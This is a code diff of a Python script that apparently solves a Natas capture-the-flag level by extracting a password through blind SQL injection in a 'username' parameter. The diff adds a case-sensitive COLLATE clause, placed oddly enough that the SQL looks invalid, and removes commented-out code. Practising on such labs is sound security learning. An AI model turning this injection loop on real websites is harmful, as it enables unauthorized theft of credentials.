@@ -11,7 +11,7 @@ headers = {
     }
 while len(password) != 32:
   for attempt in alphanum: 
-      querystring = {"debug":"yes","username":"natas16\" and password like \"" + password + attempt + "%"}
+      querystring = {"debug":"yes","username":"natas16\" and COLLATE latin1_general_cs password like \"" + password + attempt + "%"}
       response = requests.request("GET", url, headers=headers, params=querystring)
       c = response.text
       soup = BeautifulSoup(c, "html.parser")
@@ -22,17 +22,5 @@ while len(password) != 32:
         password = password + attempt
         #print("Good Value=" + password, len(password))
         break
-print(password)      
-#      for attempt in alphanum: 
- #       querystring = {"debug":"yes","username":"natas16\" and password like \"" + password + attempt + "%"}
-  #      response = requests.request("GET", url, headers=headers, params=querystring)
-   #     c = response.text  
-    #    soup = BeautifulSoup(c, "html.parser")
-    #    samples = soup.find(id='content')
-    ##    print(samples)
-    #    strsample = str(samples)
-    #    if re.search("This user exists.",strsample):
-  #unfinished and untested so ignore
-   #       password1 = password + attempt
-    #      print("Good Value.." + password1)
+print(password)
         
